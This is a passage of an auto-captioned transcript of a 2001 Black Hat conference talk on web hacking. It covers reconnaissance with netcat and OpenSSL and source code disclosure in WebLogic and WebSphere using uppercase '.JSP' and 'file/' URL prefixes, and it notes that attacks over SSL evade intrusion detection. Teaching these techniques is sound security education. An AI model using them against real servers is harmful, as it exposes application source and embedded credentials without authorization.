[
  {
    "text": "[Music]",
    "start": "1640",
    "end": "6109"
  },
  {
    "text": "welcome to black hat Windows 2K security held February 14th through the 15th 2001",
    "start": "16560",
    "end": "22320"
  },
  {
    "text": "in Las Vegas Nevada the following videotape was recorded live at the conference and produced by the sound of",
    "start": "22320",
    "end": "28080"
  },
  {
    "text": "knowledge Incorporated this is videotape number seven technical",
    "start": "28080",
    "end": "33360"
  },
  {
    "text": "track web",
    "start": "33360",
    "end": "36600"
  },
  {
    "text": "hacking thanks um for the quick intro um once again uh we have um a pretty",
    "start": "42320",
    "end": "50079"
  },
  {
    "text": "complex demo setup over here so just bear bear with us while we get difficulty sorted as usual you know",
    "start": "50079",
    "end": "56960"
  },
  {
    "text": "managing three or four machines with anti running on them is no joke and uh we facing the same issues over",
    "start": "56960",
    "end": "63160"
  },
  {
    "text": "here so uh let me get uh quickly started with what we're going to talk about and",
    "start": "63160",
    "end": "69080"
  },
  {
    "text": "u i I'll run run you through the setup once everything goes on uh JD and I are",
    "start": "69080",
    "end": "75720"
  },
  {
    "text": "going to talk about uh web attacks and what web attacks mean these days I me how",
    "start": "75720",
    "end": "83079"
  },
  {
    "text": "devastating they can be and how easy it is to pull off some of the attacks so we'll take a quick look at those uh the",
    "start": "83079",
    "end": "89640"
  },
  {
    "text": "C categories the different types and such and then we'll end with some fancy tools which JD has cooked up and uh give",
    "start": "89640",
    "end": "97200"
  },
  {
    "text": "you some new demos uh the latter part of the show we're going to do it extempore",
    "start": "97200",
    "end": "102560"
  },
  {
    "text": "unrehearsed so hopefully it all goes well power yeah so we'll just uh quickly",
    "start": "102560",
    "end": "111640"
  },
  {
    "text": "as soon as Jeff gets the sides up machine is configured as yeah we have that as a slide anyway",
    "start": "111640",
    "end": "118840"
  },
  {
    "text": "so is that a reassuring",
    "start": "118840",
    "end": "124039"
  },
  {
    "text": "sound so you're going to hate me for this but",
    "start": "128239",
    "end": "133720"
  },
  {
    "text": "uh it's going to take me a while here okay",
    "start": "133720",
    "end": "139480"
  },
  {
    "text": "um",
    "start": "140440",
    "end": "143440"
  },
  {
    "text": "wow",
    "start": "148840",
    "end": "151840"
  },
  {
    "text": "okay excellent now I have to decrypt all my",
    "start": "165480",
    "end": "174480"
  },
  {
    "text": "drives",
    "start": "178840",
    "end": "181840"
  },
  {
    "text": "godam it if it locks you out that's going",
    "start": "188080",
    "end": "193959"
  },
  {
    "text": "to",
    "start": "198519",
    "end": "201519"
  },
  {
    "text": "I son okay um is is Clinton",
    "start": "205599",
    "end": "213439"
  },
  {
    "text": "around J I don't know the exact value of this",
    "start": "215080",
    "end": "221640"
  },
  {
    "text": "piece of paper but uh it's it's at least were 10 rounds of beers so uh the first person did you",
    "start": "221640",
    "end": "228840"
  },
  {
    "text": "want to see your own password okay got one do the",
    "start": "228840",
    "end": "235480"
  },
  {
    "text": "other anyway it's up for auction",
    "start": "236680",
    "end": "241719"
  },
  {
    "text": "okay anyway let me just uh begin with",
    "start": "247120",
    "end": "252280"
  },
  {
    "text": "uh sure oh my it's embarrassing yes can you",
    "start": "255759",
    "end": "261600"
  },
  {
    "text": "hear me all okay that's like really loud um I'd like to give uh Mr Shaw a proper introduction um this is a found Stone's",
    "start": "261600",
    "end": "268800"
  },
  {
    "text": "top hacker he currently holds the the coolest most sophisticated most awesome hack any of us have ever seen and um it",
    "start": "268800",
    "end": "276680"
  },
  {
    "text": "is true it's very true he's he's a uh very shy guy um but of all our",
    "start": "276680",
    "end": "283759"
  },
  {
    "text": "penetration testings you know if we ever uh you know having difficulty this guy always gets in he's also uh has a very",
    "start": "283759",
    "end": "290600"
  },
  {
    "text": "cool trick for if you just have one hole through a fire wall HTTP that's it uh",
    "start": "290600",
    "end": "296360"
  },
  {
    "text": "one hole one way uh HTTP Port 8 into your network Mr Shaw is in it and",
    "start": "296360",
    "end": "302800"
  },
  {
    "text": "out it's really incredible he's going to talk about some of that later",
    "start": "302800",
    "end": "307159"
  },
  {
    "text": "today uh we're going to talk a little bit about that this is really his show today I'm just kind of here for the",
    "start": "308160",
    "end": "315680"
  },
  {
    "text": "ride I",
    "start": "321080",
    "end": "324159"
  },
  {
    "text": "think okay with that I give you Mr Sha",
    "start": "326960",
    "end": "331638"
  },
  {
    "text": "thanks Jeff and uh everyone for putting up with this I'll I'll make it up to you guys",
    "start": "333840",
    "end": "339960"
  },
  {
    "text": "we've got cool wallet cards web hacking I mean sorry hacking wallet cards we'll pass it around to you for being such a",
    "start": "339960",
    "end": "345479"
  },
  {
    "text": "nice impatient audience so with this uh let's get rolling uh let's quickly get into uh what we what is our Target",
    "start": "345479",
    "end": "353840"
  },
  {
    "text": "scenario what is it that we are exactly attacking uh we're going to be just talking quickly about about U the",
    "start": "353840",
    "end": "360520"
  },
  {
    "text": "components of an e-commerce scenario like and what goes into building up an e-commerce site we have a web server",
    "start": "360520",
    "end": "367880"
  },
  {
    "text": "typically front end the first server that all the client requests get sent to um then we might have an application",
    "start": "367880",
    "end": "374280"
  },
  {
    "text": "server separately or we might have that component built into the web server we may also have a database server in the",
    "start": "374280",
    "end": "380960"
  },
  {
    "text": "back end holding a big data store um of course a firewall is there like no no",
    "start": "380960",
    "end": "386840"
  },
  {
    "text": "good e-commerce shop should go without a firewall at least if you have hired Consultants that's what they what they'll tell you uh next slide",
    "start": "386840",
    "end": "395120"
  },
  {
    "text": "please then if there's a very high traffic site you might have a load balancer you might have reverse Proxy",
    "start": "395120",
    "end": "401639"
  },
  {
    "text": "Systems you might have uh cache systems sitting in between but just go to the",
    "start": "401639",
    "end": "407479"
  },
  {
    "text": "next slide and this is this is how the whole thing looks like um the there's a",
    "start": "407479",
    "end": "413280"
  },
  {
    "text": "client in the front end uh web client which can be your web browser all the",
    "start": "413280",
    "end": "418440"
  },
  {
    "text": "traffic uh goes through HTTP Port 80 is that feedback is is there a big feedback",
    "start": "418440",
    "end": "426560"
  },
  {
    "text": "H oh okay hang",
    "start": "427400",
    "end": "432639"
  },
  {
    "text": "on anyway so there's uh all the traffic gets sent through the firewall hits the",
    "start": "433039",
    "end": "439440"
  },
  {
    "text": "web server in the front end just I've just quoted some examples of popular servers over there then you might have U",
    "start": "439440",
    "end": "446879"
  },
  {
    "text": "web applications plugging in along with the data bases here's how the whole thing looks like just really quick",
    "start": "446879",
    "end": "453919"
  },
  {
    "text": "U and now let me talk to you about traditional Ways and Means of hacking that what we've been seeing so far here",
    "start": "453919",
    "end": "461840"
  },
  {
    "text": "this three basic categories of uh hacking you hack a network service you",
    "start": "461840",
    "end": "468000"
  },
  {
    "text": "can hack the protocol itself or you can hack a binary uh which either interacts",
    "start": "468000",
    "end": "473720"
  },
  {
    "text": "with a user session or network session or otherwise uh there's various complexities involved in traditional",
    "start": "473720",
    "end": "480120"
  },
  {
    "text": "hacking like first you have to make sure Network Services are allowed through you're allowed to connect through them",
    "start": "480120",
    "end": "486199"
  },
  {
    "text": "uh you know them well enough you know you can walk your way through the binaries you know assembly well you can",
    "start": "486199",
    "end": "491919"
  },
  {
    "text": "do uh shell code Stuff Etc there's lots of different architectures to deal with",
    "start": "491919",
    "end": "497840"
  },
  {
    "text": "it's a pretty complex activity next slide like you need to be able to zip through code like this and be able to",
    "start": "497840",
    "end": "503840"
  },
  {
    "text": "tell what it does um a lot of you here might find it's like it's normal that's",
    "start": "503840",
    "end": "509919"
  },
  {
    "text": "okay but this is a special group over here uh next slide so but what are the limitations",
    "start": "509919",
    "end": "516440"
  },
  {
    "text": "like we're hitting walls when we talk about traditional hacking is what is",
    "start": "516440",
    "end": "521760"
  },
  {
    "text": "happening now is uh lot of traditional attacks are now",
    "start": "521760",
    "end": "527920"
  },
  {
    "text": "failing excellent there we are okay good lot of traditional attacks are not",
    "start": "527920",
    "end": "534120"
  },
  {
    "text": "failing because uh either one of the three things is not allowed the network",
    "start": "534120",
    "end": "539200"
  },
  {
    "text": "prot protocol isn't allowed through or the protocol itself is locked down there's secure coding practices a lot of",
    "start": "539200",
    "end": "546120"
  },
  {
    "text": "vendors are learning from past mistakes the question mark is uh somewhat ironic cuz some vendors don't learn um there is",
    "start": "546120",
    "end": "554320"
  },
  {
    "text": "a lot of maturity in the software development life cycle when it comes to systems programming a lot of software",
    "start": "554320",
    "end": "560519"
  },
  {
    "text": "houses are employing those these days we seeing Tighter and title code come through next",
    "start": "560519",
    "end": "565560"
  },
  {
    "text": "slide so as you can see from the diagram um if you have a pretty strong firewall",
    "start": "565560",
    "end": "571320"
  },
  {
    "text": "and a web based architecture most of the traditional attacks might be just blocked by a firewall like even if the",
    "start": "571320",
    "end": "578279"
  },
  {
    "text": "server is vulnerable to attacks like maybe RPC attacks or ant attacks the",
    "start": "578279",
    "end": "583800"
  },
  {
    "text": "traffic is just not allowed through so you get a dead end over there next slide sometimes the holes might lie in",
    "start": "583800",
    "end": "591200"
  },
  {
    "text": "the back end which might be pretty much exposed but we might not be able to get to those either cuz they are non-",
    "start": "591200",
    "end": "597600"
  },
  {
    "text": "routable there they might be off on a separate private Network inside a DMZ or",
    "start": "597600",
    "end": "603079"
  },
  {
    "text": "something so that again is stopped next slide so when we talk about web hacking",
    "start": "603079",
    "end": "611120"
  },
  {
    "text": "uh here's how we started thinking about the whole thing that let's assume all these doors are closed and you only have",
    "start": "611120",
    "end": "616920"
  },
  {
    "text": "Port 80 or Port 443 or in short you only have HTTP to go through then what is it",
    "start": "616920",
    "end": "623600"
  },
  {
    "text": "that we can do for an e-commerce site uh it's it's a must that http should be",
    "start": "623600",
    "end": "629839"
  },
  {
    "text": "allowed through otherwise well people can't get to your web server so no matter what kind of firewalls you put",
    "start": "629839",
    "end": "635720"
  },
  {
    "text": "you'll always allow web traffic through so we always have a way in and these",
    "start": "635720",
    "end": "640920"
  },
  {
    "text": "days because web architectures are so complex you have so many things plugging into one another and components fitting",
    "start": "640920",
    "end": "647800"
  },
  {
    "text": "in you have uh uh you have virtual server sitting in between foring off",
    "start": "647800",
    "end": "653200"
  },
  {
    "text": "different parts to different components it is possible to Target back back end",
    "start": "653200",
    "end": "659720"
  },
  {
    "text": "interfaces backend components of systems through an HTTP request like you can",
    "start": "659720",
    "end": "666000"
  },
  {
    "text": "straight away talk to a database component or you can straight away talk to an application Level component all",
    "start": "666000",
    "end": "671600"
  },
  {
    "text": "through HTTP requests and because of all these complexities there are very very",
    "start": "671600",
    "end": "676680"
  },
  {
    "text": "many possibilities of holes showing up we'll show we'll show you how they happen a lot of people still think HTTP",
    "start": "676680",
    "end": "684360"
  },
  {
    "text": "is friendly traffic like if I just POS the question uh what's safer an open Port 135 on an an system or an open port",
    "start": "684360",
    "end": "692120"
  },
  {
    "text": "80 on an an system can you really tell no maybe not it all depends on what's",
    "start": "692120",
    "end": "698440"
  },
  {
    "text": "behind the port so but contrary like people will just think okay 135 is bad",
    "start": "698440",
    "end": "704519"
  },
  {
    "text": "80 is okay you know that's uh that's no longer true these days",
    "start": "704519",
    "end": "710399"
  },
  {
    "text": "next and what does a web hacker need like all you need is three things um",
    "start": "710399",
    "end": "716360"
  },
  {
    "text": "highest priority uh is this one you need a clear mind an internet connection and",
    "start": "716360",
    "end": "722000"
  },
  {
    "text": "a web browser and some more tools we might need next slide well okay let me talk",
    "start": "722000",
    "end": "728560"
  },
  {
    "text": "about this let me talk a little bit about the types of web hacks like what",
    "start": "728560",
    "end": "734079"
  },
  {
    "text": "are the different areas in an e-commerce roll out that you can Target you can hit the web server configuration like take",
    "start": "734079",
    "end": "740320"
  },
  {
    "text": "advantages of misconfigured web servers different mappings might be misconfigured and such next",
    "start": "740320",
    "end": "747199"
  },
  {
    "text": "slide you can try to blow up applications by feeding them bad input",
    "start": "747199",
    "end": "752279"
  },
  {
    "text": "or input that they don't expect you can take advantage of input validation attacks next",
    "start": "752279",
    "end": "759040"
  },
  {
    "text": "slide you can try to poison SQL queries pretty much all applications these days",
    "start": "759040",
    "end": "765279"
  },
  {
    "text": "driven by databases have some sort of a SQL interface they capture some input from the user side and pass it off as a",
    "start": "765279",
    "end": "771839"
  },
  {
    "text": "SQL query to do some lookups if you can figure out if you can think how these queries are being made and see some",
    "start": "771839",
    "end": "778160"
  },
  {
    "text": "problems with those uh you can force meta characters and such extending SQL statements next",
    "start": "778160",
    "end": "785519"
  },
  {
    "text": "slide and you can also play with HTTP sessions like HTTP was essentially",
    "start": "785519",
    "end": "791000"
  },
  {
    "text": "designed to be a stat less protocol like there's a request reply and it ends and",
    "start": "791000",
    "end": "796399"
  },
  {
    "text": "session tracking was never built into the first versions of HTTP it's always been added on as an afterthought and",
    "start": "796399",
    "end": "803480"
  },
  {
    "text": "things have been patched ever since so people have very many uh methods you",
    "start": "803480",
    "end": "809199"
  },
  {
    "text": "have hidden fields or cookies or session variables you can try to play with those and see if you can steal other people's",
    "start": "809199",
    "end": "815160"
  },
  {
    "text": "sessions so that's another type of a web hack next slide and web hacks typically cause",
    "start": "815160",
    "end": "823560"
  },
  {
    "text": "three kinds of effects you might have extra information being disclosed like if you give a URL that is too long or",
    "start": "823560",
    "end": "830800"
  },
  {
    "text": "play with some input Fields you might get an error message and with the error message you might get information like",
    "start": "830800",
    "end": "837079"
  },
  {
    "text": "physical path of the web route or you might get some server configuration notes being leaked out to you the second",
    "start": "837079",
    "end": "845839"
  },
  {
    "text": "type of uh leak educate is source code disclosure or arbitrary file content",
    "start": "845839",
    "end": "851600"
  },
  {
    "text": "disclosure like we able to pull out unpassed content of the logic behind the",
    "start": "851600",
    "end": "857839"
  },
  {
    "text": "web applications or even worse we can walk through the whole file system on the web server and pull out arbitrary",
    "start": "857839",
    "end": "863839"
  },
  {
    "text": "files there's lots of examples of those hacks and the third the most juicy one is being being able to execute arbitrary",
    "start": "863839",
    "end": "870680"
  },
  {
    "text": "commands on a Target web system so we'll will'll quickly zip through uh some of",
    "start": "870680",
    "end": "876800"
  },
  {
    "text": "uh some examples of these especially on the nt2000 platform we'll also talk to",
    "start": "876800",
    "end": "882000"
  },
  {
    "text": "you some some about Java application hacking that's becoming a popular",
    "start": "882000",
    "end": "887600"
  },
  {
    "text": "application platform these days next slide so what do you need in addition to",
    "start": "887600",
    "end": "894639"
  },
  {
    "text": "the clear mind the connection and the browser you might need a port scanner just to check what ports are open on a",
    "start": "894639",
    "end": "900720"
  },
  {
    "text": "Target web server you'd need netcat like how many of you have heard of netcat I expect to",
    "start": "900720",
    "end": "907519"
  },
  {
    "text": "see everyone raise their hands but okay it's okay uh netcat is a wonderful little utility command line TCP UDP",
    "start": "907519",
    "end": "915000"
  },
  {
    "text": "client TCP listener Swiss army knife of network utilities uh can redirect standard input",
    "start": "915000",
    "end": "922360"
  },
  {
    "text": "standard output through it so it's pretty versatile U you might need a vulnerability Checker just for web",
    "start": "922360",
    "end": "928519"
  },
  {
    "text": "checks like quick low hanging fruit for web vulnerabilities there's a program",
    "start": "928519",
    "end": "934199"
  },
  {
    "text": "called Whisker by rainforest puppy uh it's a pretty good one if you're trying to hack over SSL connections you would",
    "start": "934199",
    "end": "941040"
  },
  {
    "text": "need open SSL which is an SSL enabled uh client or a listener actually",
    "start": "941040",
    "end": "948440"
  },
  {
    "text": "op SSL is a suite of utilities and programming libraries it has an open SSL",
    "start": "948440",
    "end": "954880"
  },
  {
    "text": "binary which can act as a client or a listener next slide",
    "start": "954880",
    "end": "960480"
  },
  {
    "text": "well just to quickly run through the steps that a web hacker might take uh first few steps are try to port scan",
    "start": "960480",
    "end": "966959"
  },
  {
    "text": "Target systems to see what uh what ports get returned as open um in this case we",
    "start": "966959",
    "end": "973600"
  },
  {
    "text": "don't need to port scan a whole range we're just interested in a few well-known web ports like 8081 is common",
    "start": "973600",
    "end": "980560"
  },
  {
    "text": "443 then all the other high numbered web ports you might have 8,880 7,1 70002 Etc",
    "start": "980560",
    "end": "989839"
  },
  {
    "text": "uh next slide and uh once you're done with the port scanning you pretty much go and",
    "start": "989839",
    "end": "996000"
  },
  {
    "text": "take a look at uh all the open ports to see what kind of a web server you might have and you can use netcat to do that",
    "start": "996000",
    "end": "1003120"
  },
  {
    "text": "and send uh head directive uh and the web server might return you the HTTP",
    "start": "1003120",
    "end": "1009120"
  },
  {
    "text": "headers let's just quickly do a demo to make sure everything's working",
    "start": "1009120",
    "end": "1015360"
  },
  {
    "text": "um so here it's okay I'll flip through the slides don't worry about",
    "start": "1016000",
    "end": "1022480"
  },
  {
    "text": "it uh this this guy you want you want the dual display",
    "start": "1024880",
    "end": "1031360"
  },
  {
    "text": "on oh okay there we are just go to the DOS",
    "start": "1035280",
    "end": "1041640"
  },
  {
    "text": "prompt on the top oops okay I'm just going to do a quick",
    "start": "1042120",
    "end": "1049640"
  },
  {
    "text": "uh request uh I'm going to do a netcat uh is this",
    "start": "1049640",
    "end": "1055799"
  },
  {
    "text": "readable like oh it's hard doesn't get any bigger than",
    "start": "1055799",
    "end": "1063200"
  },
  {
    "text": "this so let me try to see if I can get a bigger font going for you oh this",
    "start": "1066039",
    "end": "1071919"
  },
  {
    "text": "worse oh well anyway I'm going to try to Target",
    "start": "1071919",
    "end": "1079080"
  },
  {
    "text": "uh the system 10.0.0 do10 on Port 80 and",
    "start": "1079080",
    "end": "1084120"
  },
  {
    "text": "do quick head/ HTTP",
    "start": "1084120",
    "end": "1089039"
  },
  {
    "text": "1.0 well it uh returns us with um a response says HTTP 1.1 it gives an error",
    "start": "1089679",
    "end": "1098120"
  },
  {
    "text": "May the access was forbidden because this type of request or the resource might be denied but what we get the",
    "start": "1098120",
    "end": "1104240"
  },
  {
    "text": "information we get is it says server is Microsoft is 5.0",
    "start": "1104240",
    "end": "1109799"
  },
  {
    "text": "I mean this may not be conclusive people can play with this uh string but for the most part we'll be able to find out what",
    "start": "1109799",
    "end": "1116440"
  },
  {
    "text": "kind of server it is we can even do a quick operating system fingerprint and determine that so that's uh pretty much",
    "start": "1116440",
    "end": "1122880"
  },
  {
    "text": "the first step that uh you need to do for identifying servers next",
    "start": "1122880",
    "end": "1128600"
  },
  {
    "text": "slide next is if you find a server you might want to run a quick uh check for low hanging fruit and see if there's",
    "start": "1128600",
    "end": "1136159"
  },
  {
    "text": "anything directly vulnerable you might run whisker gives you a quick dump of all known bugs if there are any um",
    "start": "1136159",
    "end": "1144200"
  },
  {
    "text": "you're not going to run that right now so cool with it next next slide if it's",
    "start": "1144200",
    "end": "1150720"
  },
  {
    "text": "all going over SSL we can do open SSL um I'm just going to do a quick open",
    "start": "1150720",
    "end": "1157400"
  },
  {
    "text": "SSL here um",
    "start": "1157400",
    "end": "1163880"
  },
  {
    "text": "um it is user local SL bin",
    "start": "1163880",
    "end": "1170080"
  },
  {
    "text": "op SSL sore client uh minus connect",
    "start": "1170080",
    "end": "1176559"
  },
  {
    "text": "10.0.0 do",
    "start": "1176559",
    "end": "1181000"
  },
  {
    "text": "10443 once I do this uh open SSL tries to connect to the SSL site you can see",
    "start": "1181720",
    "end": "1188600"
  },
  {
    "text": "the whole c key and certificate exchange over here and now we can give commands",
    "start": "1188600",
    "end": "1194080"
  },
  {
    "text": "we can say head/ HTTP 1.0 just like we would in",
    "start": "1194080",
    "end": "1199159"
  },
  {
    "text": "netcat and we get our response back so don't assume that uh SSL is a Beall and",
    "start": "1199159",
    "end": "1207720"
  },
  {
    "text": "endall penasia for securing websites SSL only secures the traffic in transit",
    "start": "1207720",
    "end": "1214240"
  },
  {
    "text": "between the web browser and the web server it does not secure anything else so people who say that well our site is",
    "start": "1214240",
    "end": "1220520"
  },
  {
    "text": "protected because we use SSL or very sign certificates or strong or weak or whatever crypto that's uh that's",
    "start": "1220520",
    "end": "1227400"
  },
  {
    "text": "entirely useless um in fact with SSL if you hack over SSL",
    "start": "1227400",
    "end": "1233400"
  },
  {
    "text": "you'll defeat intrusion detection systems so your attacks will go encrypted secure",
    "start": "1233400",
    "end": "1239400"
  },
  {
    "text": "undetected so uh that's that's the other the other flip side of SSL it gives",
    "start": "1239400",
    "end": "1246080"
  },
  {
    "text": "people a false sense of security I've seen that in practice people say ah you won't be able to break through cuz it's",
    "start": "1246080",
    "end": "1251280"
  },
  {
    "text": "SSL too bad um yeah we can um we can also come up",
    "start": "1251280",
    "end": "1261600"
  },
  {
    "text": "with a quick uh three command version of an SSL proxy using netcat and open SSL",
    "start": "1261600",
    "end": "1267640"
  },
  {
    "text": "coupled together in a shell script and uh if we want to run fancy attacks we",
    "start": "1267640",
    "end": "1273400"
  },
  {
    "text": "can use a intermediate system which acts as an SSL proxy receives all requests on",
    "start": "1273400",
    "end": "1279400"
  },
  {
    "text": "Port 80 in clear http and sends everything over SSL so if you want to",
    "start": "1279400",
    "end": "1285039"
  },
  {
    "text": "run a quick vulnerability check over SSL or want to run an explo over SSL that's",
    "start": "1285039",
    "end": "1290080"
  },
  {
    "text": "possible too next slide okay so to give you a quick uh overview of our targets",
    "start": "1290080",
    "end": "1297039"
  },
  {
    "text": "we have three systems over here um we have uh we have one and two systems on",
    "start": "1297039",
    "end": "1304559"
  },
  {
    "text": "this one it's running VMware and my vision is okay it's not I'm not seeing",
    "start": "1304559",
    "end": "1309919"
  },
  {
    "text": "double and uh we have another system over here uh one of them is running win",
    "start": "1309919",
    "end": "1316080"
  },
  {
    "text": "2000 and 5.0 the other two ones are nt4 is one with SQL server and one is",
    "start": "1316080",
    "end": "1323559"
  },
  {
    "text": "running some Java web server so these are our targets we're going to walk you through these when we attack the",
    "start": "1323559",
    "end": "1329880"
  },
  {
    "text": "different systems next slide okay so we come into the first category of uh",
    "start": "1329880",
    "end": "1336760"
  },
  {
    "text": "attacks source code disclosure uh here's a guy called shirad sha who is my",
    "start": "1336760",
    "end": "1342640"
  },
  {
    "text": "partner in crime at foundstone he is a maniac when it comes to hacking up Java",
    "start": "1342640",
    "end": "1348240"
  },
  {
    "text": "appli app ation servers his uh speed is like two vulnerabilities per week",
    "start": "1348240",
    "end": "1354159"
  },
  {
    "text": "sometimes when he gets going really fast just breaks him apart and he discovered",
    "start": "1354159",
    "end": "1360000"
  },
  {
    "text": "an interesting bug in web logic and web sphere which we've called the uppercase",
    "start": "1360000",
    "end": "1365039"
  },
  {
    "text": "JSP bug JSP is uh Java server Pages",
    "start": "1365039",
    "end": "1370520"
  },
  {
    "text": "which is embedded Java tags within HTML pages on a Java platform so when the",
    "start": "1370520",
    "end": "1376480"
  },
  {
    "text": "page is served up the Java code is is compiled executed and the results are embedded in the HTML page pretty much",
    "start": "1376480",
    "end": "1383840"
  },
  {
    "text": "like the server side includes or active server Pages what shat discovered is",
    "start": "1383840",
    "end": "1389720"
  },
  {
    "text": "using uppercase JSP as an extension when requesting resources from web logic or",
    "start": "1389720",
    "end": "1397039"
  },
  {
    "text": "web sphere running on Windows NT he was able to retrieve uh JSP and jhtml files",
    "start": "1397039",
    "end": "1403600"
  },
  {
    "text": "uh without them being passed we could get the whole source code now looking",
    "start": "1403600",
    "end": "1409080"
  },
  {
    "text": "into it uh he discovered why and I'll walk you through the reasons here's just",
    "start": "1409080",
    "end": "1415080"
  },
  {
    "text": "a quick screen cap on the left hand side you see the normal page appearing the",
    "start": "1415080",
    "end": "1420240"
  },
  {
    "text": "URL uh it's in your slide so you'll be able to read the URL it's called Uh jdbc",
    "start": "1420240",
    "end": "1426159"
  },
  {
    "text": "table. JSP and if you give the same request in uppercase JSP uh you get the source code",
    "start": "1426159",
    "end": "1432840"
  },
  {
    "text": "displayed in the browser window now how did this happen like initially sheir",
    "start": "1432840",
    "end": "1438960"
  },
  {
    "text": "found this by accident cuz he left the caps lock key on that's true that's a fact and this",
    "start": "1438960",
    "end": "1446200"
  },
  {
    "text": "was before he was working with foundstone he he happens to be one of my best friends I've known him for years",
    "start": "1446200",
    "end": "1452120"
  },
  {
    "text": "and uh we got analyzing this the story I love shiraj he's the sweetest guy and",
    "start": "1452120",
    "end": "1457640"
  },
  {
    "text": "when he first came he only knew one word okay he say sure let's go she go okay",
    "start": "1457640",
    "end": "1462840"
  },
  {
    "text": "shiraj I need to exploit okay was great yeah right now he's he's",
    "start": "1462840",
    "end": "1468600"
  },
  {
    "text": "enjoying his honeymoon in uh the coconut Lagoon in India so he couldn't be with us but um yeah this was when he was",
    "start": "1468600",
    "end": "1476480"
  },
  {
    "text": "working in New York uh he he kept caps lock on found this bug yes your",
    "start": "1476480",
    "end": "1483520"
  },
  {
    "text": "question no I his question is does this work if it's running on Solaris straight",
    "start": "1484159",
    "end": "1490520"
  },
  {
    "text": "answer no uh explanation comes in the next slide uh okay no no hit",
    "start": "1490520",
    "end": "1497039"
  },
  {
    "text": "back uh well",
    "start": "1497039",
    "end": "1501120"
  },
  {
    "text": "um okay next",
    "start": "1502080",
    "end": "1506398"
  },
  {
    "text": "one today okay next slide that's fine that's okay sure I'm sure I'm sure okay",
    "start": "1507520",
    "end": "1516480"
  },
  {
    "text": "dude all right actually I mean you got to love JD",
    "start": "1516480",
    "end": "1523679"
  },
  {
    "text": "he's a good friend um okay so here's a here's a long and short of the whole bug I I'll skip",
    "start": "1523679",
    "end": "1530000"
  },
  {
    "text": "through the story of the whole analysis but uh looking at the configuration file of web logic uh here are the",
    "start": "1530000",
    "end": "1537320"
  },
  {
    "text": "configuration directives if you see there's different kind of resources being handled by different kind of",
    "start": "1537320",
    "end": "1543880"
  },
  {
    "text": "handlers like for an HTML you have something called the file serlet that serves out the page for shtml you have",
    "start": "1543880",
    "end": "1551480"
  },
  {
    "text": "an SSI serlet or a server side include serlet for JSP you have JSP serlet which",
    "start": "1551480",
    "end": "1558000"
  },
  {
    "text": "proc processes these pages so well what happened is when you give the URL index",
    "start": "1558000",
    "end": "1564679"
  },
  {
    "text": "with uppercase GSP it fails to match any of these configuration directives like",
    "start": "1564679",
    "end": "1571000"
  },
  {
    "text": "says JSP uppercase is not JSP lower case so it just falls through and hits the",
    "start": "1571000",
    "end": "1576399"
  },
  {
    "text": "default directive so the default Handler is nothing but return everything",
    "start": "1576399",
    "end": "1582120"
  },
  {
    "text": "unpassed now when the operating system gets a request to open up index.",
    "start": "1582120",
    "end": "1587279"
  },
  {
    "text": "uppercase GS see that's where Windows comes in cuz Windows can't tell the difference between uppercase and lower",
    "start": "1587279",
    "end": "1593279"
  },
  {
    "text": "case when it comes to file names so windows will happily retrieve the file",
    "start": "1593279",
    "end": "1599200"
  },
  {
    "text": "uppercase or lower case and return you all the output on Unix or Solaris you'll get a 404 not found because index.",
    "start": "1599200",
    "end": "1606840"
  },
  {
    "text": "uppercase GSP doesn't exist so that was the long and short of this bug well the",
    "start": "1606840",
    "end": "1613360"
  },
  {
    "text": "analysis took us almost a couple of days to figure out why this happened over the phone and he liked it so much he decided",
    "start": "1613360",
    "end": "1620480"
  },
  {
    "text": "to quit his job and get into the security business he's uh he's written",
    "start": "1620480",
    "end": "1626200"
  },
  {
    "text": "15 other advisories since so he he pretty much fell into his comfort level",
    "start": "1626200",
    "end": "1632440"
  },
  {
    "text": "with this thing next slide here are some more uh here are some more tricks for source code",
    "start": "1632440",
    "end": "1638960"
  },
  {
    "text": "disclosure on different uh application platforms all courtsy shiraj uh he he",
    "start": "1638960",
    "end": "1644480"
  },
  {
    "text": "came up with all these so um I'm going to just uh quote and give you a quick demo of",
    "start": "1644480",
    "end": "1650320"
  },
  {
    "text": "these um let me fire up a browser on our uh systems we have uh web",
    "start": "1650320",
    "end": "1656600"
  },
  {
    "text": "logic and um Java web server running so we'll show you a quick example of",
    "start": "1656600",
    "end": "1663518"
  },
  {
    "text": "these that's F so here is the browser",
    "start": "1663559",
    "end": "1669679"
  },
  {
    "text": "um let me first uh go over to 10.0.0",
    "start": "1669679",
    "end": "1676000"
  },
  {
    "text": "do2 Port 7,1 that's where we have web logic",
    "start": "1676000",
    "end": "1683158"
  },
  {
    "text": "running and bringing back the page yeah it's web",
    "start": "1683960",
    "end": "1689200"
  },
  {
    "text": "logic application server over here I have a file called hellor wl.",
    "start": "1689200",
    "end": "1698120"
  },
  {
    "text": "JSP um I'm going to just pull up that file hellor wl.",
    "start": "1698120",
    "end": "1704360"
  },
  {
    "text": "JSP it's a simple Java server page which has few print statements in it just says",
    "start": "1704360",
    "end": "1710120"
  },
  {
    "text": "uh hello world welcome to black hat w2k now if I prefix the URL with the",
    "start": "1710120",
    "end": "1717279"
  },
  {
    "text": "word file so I say http1 0012 file hello WL",
    "start": "1717279",
    "end": "1724880"
  },
  {
    "text": "GSP it's going to return me the source code without it being passed that's because this process this request gets",
    "start": "1724880",
    "end": "1732799"
  },
  {
    "text": "handled by the default file serlet if I prefix this with with uh",
    "start": "1732799",
    "end": "1739720"
  },
  {
    "text": "let's say star. shtml it'll get handled by the SSI",
    "start": "1739720",
    "end": "1747240"
  },
  {
    "text": "serlet which doesn't understand JSP tags so it's going to return output like this",
    "start": "1747240",
    "end": "1753760"
  },
  {
    "text": "if we do a view Source we have the whole uh we have the whole GSP code in here now what's the",
    "start": "1753760",
    "end": "1760519"
  },
  {
    "text": "significance of a source code disclosure like like why is it uh why is it quite a",
    "start": "1760519",
    "end": "1766320"
  },
  {
    "text": "killer bug because some sometimes not only can you retrieve all your business logic or critical application logic",
    "start": "1766320",
    "end": "1773039"
  },
  {
    "text": "using this method but if programs have built in connection information or",
    "start": "1773039",
    "end": "1779039"
  },
  {
    "text": "passwords or other sensitive logic like proprietary algorithms for Maybe random",
    "start": "1779039",
    "end": "1784080"
  },
  {
    "text": "number generation or session variable generation or you might have some uh",
    "start": "1784080",
    "end": "1789720"
  },
  {
    "text": "crypto stuff in there you'll be able to retrieve all that stuff and uh figure out what's going on so that was a quick",
    "start": "1789720",
    "end": "1797200"
  },
  {
    "text": "look at um source code disclosure on web logic next slide if I'm going too fast",
    "start": "1797200",
    "end": "1803200"
  },
  {
    "text": "or if you don't understand what the hell I'm talking about please feel free to inter interrupt me like you are doing",
    "start": "1803200",
